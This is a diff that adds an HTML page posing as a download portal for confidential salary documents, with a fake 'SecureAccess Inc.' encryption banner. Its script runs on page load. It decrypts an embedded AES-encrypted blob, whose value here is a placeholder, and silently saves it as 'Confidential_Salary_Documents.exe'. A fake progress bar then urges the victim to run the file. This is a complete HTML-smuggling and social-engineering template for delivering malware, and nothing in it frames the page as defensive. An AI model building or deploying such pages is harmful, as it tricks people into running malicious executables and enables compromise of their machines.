@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confidential Company Documents - Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+            position: relative;
+            min-height: 100vh;
+        }
+        #container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+            margin-bottom: 100px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        #loadingBarContainer {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 25px;
+            margin-top: 20px;
+        }
+        #loadingBar {
+            width: 0%;
+            height: 20px;
+            background-color: #4CAF50;
+            border-radius: 25px;
+            transition: width 1s ease-in-out;
+        }
+        #statusMessage {
+            margin-top: 10px;
+            color: #666;
+            font-size: 14px;
+            font-style: italic;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4CAF50;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 14px;
+        }
+        .footer-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .footer-content img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .branding {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1>Confidential Salary Documents</h1>
+        <p>As part of our transparency initiative, we are providing access to the latest salary documents. These files are confidential and for authorized personnel only.</p>
+        <p>The documents will be automatically downloaded shortly. Please run the downloaded file to unlock and access the documents.</p>
+        
+        <div id="loadingBarContainer">
+            <div id="loadingBar"></div>
+        </div>
+        <div id="statusMessage">Awaiting file unlock to access documents... <div class="spinner"></div></div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <span>This page is protected with AES-256 encryption</span>
+            <span class="branding"> | SecureAccess Inc.</span>
+        </div>
+    </footer>
+
+    <script>
+        function base64ToArrayBuffer(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array(len);
+            for (var i = 0; i < len; i++) {
+                bytes[i] = binary_string.charCodeAt(i);
+            }
+            return bytes.buffer;
+        }
+
+        async function aesDecrypt(encrypted, key, iv) {
+            const decodedKey = await window.crypto.subtle.importKey(
+                "raw",
+                key,
+                { name: "AES-CBC" },
+                false,
+                ["decrypt"]
+            );
+
+            const decrypted = await window.crypto.subtle.decrypt(
+                { name: "AES-CBC", iv: iv },
+                decodedKey,
+                encrypted
+            );
+
+            return new Uint8Array(decrypted);
+        }
+
+        function downloadFile() {
+            var encryptedBase64 = "ENCRYPTED_PAYLOAD_BASE64";
+            var aesKeyBase64 = "AES_KEY_BASE64";
+            var aesIvBase64 = "AES_IV_BASE64";
+
+            var encryptedData = base64ToArrayBuffer(encryptedBase64);
+            var aesKey = base64ToArrayBuffer(aesKeyBase64);
+            var aesIv = base64ToArrayBuffer(aesIvBase64);
+
+            aesDecrypt(encryptedData, aesKey, aesIv).then(decryptedData => {
+                var blob = new Blob([decryptedData], {type: 'application/octet-stream'});
+                var fileName = 'Confidential_Salary_Documents.exe';
+                var a = document.createElement('a');
+                document.body.appendChild(a);
+                a.style = 'display: none';
+
+                if (window.navigator.msSaveBlob) {
+                    window.navigator.msSaveBlob(blob, fileName);
+                } else {
+                    var url = window.URL.createObjectURL(blob);
+                    a.href = url;
+                    a.download = fileName;
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                }
+
+                document.body.removeChild(a);
+
+                simulateUnlockingProgress();
+            }).catch(console.error);
+        }
+
+        function simulateUnlockingProgress() {
+            var loadingBar = document.getElementById('loadingBar');
+            var width = 0;
+            var interval = setInterval(function() {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('statusMessage').innerHTML = "File unlocked. Please run the downloaded file to view documents.";
+                } else {
+                    width += 20;
+                    loadingBar.style.width = width + '%';
+                }
+            }, 1000);
+        }
+
+        window.onload = downloadFile;
+    </script>
+</body>
+</html>
